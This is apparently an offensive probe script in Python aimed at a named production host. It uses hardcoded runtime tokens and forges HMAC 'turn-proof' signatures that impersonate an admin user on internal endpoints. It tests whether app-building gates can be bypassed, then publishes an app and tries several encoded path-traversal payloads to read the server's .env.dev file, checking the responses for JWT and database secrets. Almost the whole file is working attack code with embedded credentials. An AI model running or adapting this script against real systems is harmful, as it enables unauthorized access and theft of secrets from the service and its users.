#!/usr/bin/env python3
# intent 28687 - Lumii center apps/workflow `code-publish` + preview/download/artifact path handling.
# question: is code-publish (write) reachable + can it write somewhere executed (RCE) or can its read
# dual (preview / /l/ static) be traversed to read /opt/lumii-prod/.env.dev ?
import os, sys, json, time, base64, subprocess, hmac, hashlib

_REF = os.environ.get("GITHUB_REF_NAME", "") or ""
if "results" in _REF:
    print("results-branch-skip", flush=True); sys.exit(0)

HOST = "assistant.lumiiai.cn"
ORG  = "org_bTLzxtBLmugV8uxx4QTyw"
RID  = "rt_KTWyBZUur4cjUsRGP3zRk"
RTOKEN = "jy3151agR2zGGHQ08X_m52K04nsfiVsYi7LEJNDRE4Q"
ADMIN = "usr_ZxLewKrgbRYSm7rWDtQX8"
UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36"
START = time.time()
def el(): return int(time.time() - START)
def _b64(s): return base64.b64encode(s.encode("utf-8", "replace")).decode()
def R(k, v):
    s = v if isinstance(v, str) else json.dumps(v, ensure_ascii=False)
    print("R:%s:%s" % (k, _b64(s)), flush=True)
def log(*a): print("L: " + " ".join(str(x) for x in a), flush=True)

def curl(args, timeout=40):
    try:
        r = subprocess.run(["curl", "-s", "-k", "-m", str(timeout)] + args, capture_output=True, timeout=timeout + 15)
        return r.returncode, r.stdout, r.stderr[:300]
    except Exception as e:
        return -1, b"", repr(e)[:200]

def call(path, method="GET", body=None, hdrs=None, timeout=40, maxlen=200000, host=None):
    url = "https://%s%s" % (host or HOST, path)
    args = ["--http2", "-A", UA, "-H", "Accept: application/json",
            "-H", "Referer: https://%s/" % (host or HOST), "-H", "Origin: https://%s" % (host or HOST),
            "-w", "\n__CODE__%{http_code}"]
    if hdrs:
        for k, v in hdrs.items(): args += ["-H", "%s: %s" % (k, v)]
    if body is not None:
        args += ["-X", method, "-H", "Content-Type: application/json", "--data-binary", json.dumps(body)]
    elif method != "GET":
        args += ["-X", method]
    args += [url]
    rc, out, err = curl(args, timeout=timeout)
    txt = out.decode("utf-8", "replace")
    code = ""
    i = txt.rfind("__CODE__")
    if i >= 0:
        code = txt[i + 8:].strip()[:3]; txt = txt[:i]
    return {"path": path, "code": code, "body": txt[:maxlen], "len": len(txt),
            "err": (err.decode("utf-8", "replace") if isinstance(err, (bytes, bytearray)) else str(err))}

SK = "conv_28687probe"
PLATFORM = "dashboard"
PROOF_KEY = None
def b64u(b): return base64.urlsafe_b64encode(b).rstrip(b"=").decode()

def make_proof(actor=ADMIN, sk=SK, platform=PLATFORM, ttl=1500):
    if not PROOF_KEY: return ""
    now = int(time.time())
    claims = {"session_key": sk, "platform": platform, "chat_id": sk, "actor_id": actor,
              "iss": RID, "aud": RID, "iat": now - 5, "exp": now + ttl}
    p = b64u(json.dumps(claims, separators=(",", ":")).encode())
    sig = b64u(hmac.new(PROOF_KEY.encode(), p.encode(), hashlib.sha256).digest())
    return "v2." + p + "." + sig

def internal(name, extra=None, maxlen=200000, actor=ADMIN, sk=SK, timeout=40):
    b = {"platform": PLATFORM, "actor_id": actor, "session_key": sk}
    if extra: b.update(extra)
    hdrs = {"Authorization": "Bearer " + RTOKEN, "x-agent-id": RID}
    pr = make_proof(actor=actor, sk=sk)
    if pr: hdrs["x-lumii-turn-proof"] = pr
    return call("/internal/" + name, "POST", b, hdrs=hdrs, maxlen=maxlen, timeout=timeout)

def J(r):
    try: return json.loads(r["body"])
    except Exception: return None

# ============ PHASE A: identity + proof_key ============
log("### A identity t=%ds" % el())
k = call("/api/runtimes/keys/current", hdrs={"x-agent-id": RID, "x-agent-token": RTOKEN})
kj = {}
try:
    kj = json.loads(k["body"]); PROOF_KEY = kj.get("proof_key")
except Exception: pass
R("A_keys", {"code": k["code"], "have_pk": bool(PROOF_KEY), "v": kj.get("proof_key_version")})
p = internal("projects/list", {}, maxlen=20000)
R("A_projects", {"code": p["code"], "body": p["body"][:800]})

# ============ PHASE B: apps code-* gating oracle (fake app id => 403 builder_only vs 404 not_found) ============
log("### B apps gating oracle t=%ds" % el())
FAKE = "app_AAAAAAAAAAAAAAAA"
o1 = internal("apps/code-init", {"app_id": FAKE, "template": "static"})
R("B_code_init", {"code": o1["code"], "body": o1["body"][:600]})
o2 = internal("apps/code-snapshot", {"app_id": FAKE, "files": [{"path": "x_probe.txt", "content": "x"}]})
R("B_code_snapshot", {"code": o2["code"], "body": o2["body"][:600]})
o3 = internal("apps/code-publish", {"app_id": FAKE})
R("B_code_publish", {"code": o3["code"], "body": o3["body"][:600]})

# gate-free sibling (handoff has NO builderGate) - proves body-actor+proof reaches the apps family at all
o4 = internal("apps/handoff", {"requirement": "probe28687 noop", "folder_id": "tkf_FAKEFAKEFAKE"})
R("B_handoff_unknownfolder", {"code": o4["code"], "body": o4["body"][:800]})

# resolve real folders/sheets so we can (if gate passes) create an app
res = internal("tickets/resolve", {}, maxlen=400000)
rj = J(res) or {}
folders = [{"id": f.get("id"), "name": f.get("name")} for f in (rj.get("folders") or []) if f.get("id")]
R("B_resolve", {"code": res["code"], "folders": len(folders), "first": folders[:3]})

gate_passed = (o1["code"] in ("404", "400") and "builder_only" not in o1["body"])
R("B_gate_verdict", {"code_init": o1["code"], "snapshot": o2["code"], "publish": o3["code"], "gate_passed": gate_passed})

# ============ PHASE C: if gate passed, full create->snapshot->publish->read ============
app_id = None
link_token = None
if gate_passed and folders:
    log("### C full code flow t=%ds" % el())
    fid = folders[0]["id"]
    h = internal("apps/handoff", {"requirement": "probe28687 code app", "folder_id": fid, "name": "probe28687"})
    R("C_handoff", {"code": h["code"], "body": h["body"][:1200]})
    hj = J(h) or {}
    app_id = (hj.get("app") or {}).get("id")
    R("C_appid", {"app_id": app_id})
    if app_id:
        ci = internal("apps/code-init", {"app_id": app_id, "template": "static"})
        R("C_code_init", {"code": ci["code"], "body": ci["body"][:1200]})
        files = [{"path": "index.html", "content": "<html><body>probe28687</body></html>"},
                 {"path": "x_probe.txt", "content": "x_probe28687"}]
        cs = internal("apps/code-snapshot", {"app_id": app_id, "files": files, "note": "probe28687"})
        R("C_code_snapshot", {"code": cs["code"], "body": cs["body"][:1500]})
        # publish needs access_mode public for /l/ to serve static
        sa = internal("apps/set-access", {"app_id": app_id, "mode": "public"})
        R("C_set_access", {"code": sa["code"], "body": sa["body"][:1500]})
        saj = J(sa) or {}
        link_token = (saj.get("access") or {}).get("public_url")
        cp = internal("apps/code-publish", {"app_id": app_id})
        R("C_code_publish", {"code": cp["code"], "body": cp["body"][:1500]})
        R("C_link", {"public_url": link_token})
        if link_token and "/l/" in link_token:
            tok = link_token.split("/l/")[1].strip("/")
            for nm, rel in [("idx", ""), ("xprobe", "x_probe.txt"),
                            ("trav1", "../../../../../../opt/lumii-prod/.env.dev"),
                            ("trav2", "..%2f..%2f..%2f..%2f..%2f..%2fopt%2flumii-prod%2f.env.dev"),
                            ("trav3", "%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fopt%2flumii-prod%2f.env.dev"),
                            ("trav4", "..%252f..%252f..%252f..%252f..%252f..%252fopt%252flumii-prod%252f.env.dev"),
                            ("abs", "/opt/lumii-prod/.env.dev"),
                            ("dotdot", "..%5c..%5c..%5c..%5c..%5c..%5copt%5clumii-prod%5c.env.dev")]:
                rr = call("/l/%s/%s" % (tok, rel), timeout=25, maxlen=4000)
                R("C_read_%s" % nm, {"code": rr["code"], "len": rr["len"],
                                     "head": rr["body"][:300],
                                     "envleak": ("JWT_SECRET" in rr["body"] or "DATABASE_URL" in rr["body"])})
            # preview route: sign not available (jwtSecret rotated) -> just probe with fake sig
            pr = call("/api/public/app-code/%s/v1/9999999999.deadbeef/index.html" % app_id, timeout=25, maxlen=1000)
            R("C_preview_fakesig", {"code": pr["code"], "body": pr["body"][:300]})
else:
    R("C_skipped", {"gate_passed": gate_passed, "folders": len(folders)})

# ============ PHASE D: read-dual traversal semantics on a known public link token (if any) ============
# any /l/ token reachable? try a couple of encoded path shapes against a NON-existent token to see
# whether path handling runs before token lookup (it must not).
token_probe = "AAAAAAAAAAAAAAAA"
for nm, rel in [("t2", "../../../../opt/lumii-prod/.env.dev"),
                 ("t3", "..%2f..%2f..%2f..%2fopt%2flumii-prod%2f.env.dev")]:
    rr = call("/l/%s/%s" % (token_probe, rel), timeout=25, maxlen=800)
    R("D_%s" % nm, {"code": rr["code"], "len": rr["len"], "head": rr["body"][:160]})

R("DONE", {"t": el(), "gate_passed": gate_passed, "app_id": app_id, "link": link_token})
